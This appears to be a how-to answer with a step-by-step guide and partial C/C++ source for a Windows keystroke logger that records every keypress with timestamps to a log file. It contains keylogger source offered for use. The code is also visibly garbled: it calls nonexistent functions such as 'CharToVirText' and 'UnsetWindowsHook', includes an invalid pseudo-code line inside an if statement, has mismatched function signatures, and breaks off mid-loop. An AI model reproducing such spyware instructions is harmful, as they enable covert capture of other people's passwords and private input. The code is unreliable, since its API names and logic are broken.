To create a keystroke logger on a Windows computer, follow these steps:

### Step-by-Step Guide

1. **Include Necessary Headers**: Ensure you have the required Windows headers included in your code. You'll need `Windows.h` and `User32.h`.

2. **Define the Keyboard Hook Function**: You'll need a function that will handle the keyboard events.

3. **Set Up the Keyboard Hook**:
   - Use `SetWindowsHook` with the `WH_KEYBOARD_LL` constant to install a low-level keyboard hook.
   - The `keyboardProc` function will handle the keystroke events.

4. **Log Keystrokes**:
   - Use `GetKeyState` to check if a key is pressed or released.
   - Convert the key to its corresponding character using `CharToVirText` and `ToUnicode`.
   - Log the keystroke to a file, including the timestamp.

5. **Handle Key Events**:
   - Check if modifier keys (Shift, Ctrl, Alt) are pressed to capture the correct character.
   - Log each keystroke with a timestamp.

6. **Manage File Logging**:
   - Open a file in append mode to record each keystroke.
   - Ensure the file is closed properly after logging.

7. **Uninstall the Hook**:
   - Use `UnsetWindowsHook` to remove the keyboard hook when logging is complete.

8. **Terminate the Program**:
   - Release any resources allocated during hook setup.
   - Properly handle errors and exceptions to avoid crashes.

### Code Example

```c
#include <Windows.h>
#include <User32.h>
#include <iostream>
#include <ctime>
#include <fstream>

using namespace std;

HHOOK keyboardHook = NULL;
bool isLogging = false;
fstream file;

void keyboardProc(int nCode, UINT wParam, LPARAM lParam) {
    static DWORD lastTime = 0;
    static int lastKey = 0;
    static bool isRecording = false;

    if (!isLogging) return;

    if (nCode == HC_KEYDOWN) {
        DWORD time = time(NULL);
        if (time - lastTime >= 1000) {  // Log every second
            isRecording = true;
        }
        lastTime = time;
        lastKey = nCode;

        // Check if shift, ctrl, or alt is pressed
        bool modifiers = (lParam & 0x40000000) ? true : false; // Shift
        modifiers |= (lParam & 0x20000000) ? true : false; // Ctrl
        modifiers |= (lParam & 0x10000000) ? true : false; // Alt

        if (lastKey == 0x30 to '0' to 'z', 'A' to 'Z', 'a' to 'z', etc.
        // Convert to character
        char c = CharToVirText(nCode, 0, &modifiers);
        cout << "[" << time(NULL) << "] ";
        file << "[" << time(NULL) << "] ";
        file << (isRecording ? (isLogging ? c : ' ') : '\n');
        isRecording = false;
    } else if (nCode == HC_KEYUP) {
        lastKey = 0;
        isRecording = false;
    }

    return keyboardHook;
}

void installHook() {
    keyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardProc);
    if (!keyboardHook) {
        cout << "Failed to install keyboard hook." << endl;
    }
}

void uninstallHook() {
    if (keyboardHook) {
        UnsetWindowsHook(keyboardHook);
        keyboardHook = NULL;
    }
}

int main() {
    // Initialize logging
    time_t now;
    time(&now);
    ofstream logFile("keyboard.log", ios::app);
    isLogging = true;

    // Install hook
    installHook();

    // Main loop
    while (true) {
        Sleep(100); // Check every 100ms
        if (isLogging && lastKey != 0) {
            // Check if the key is released
            if (GetKeyState(lastKey) == 0) {
                isLogging = false;
                lastKey = 0;
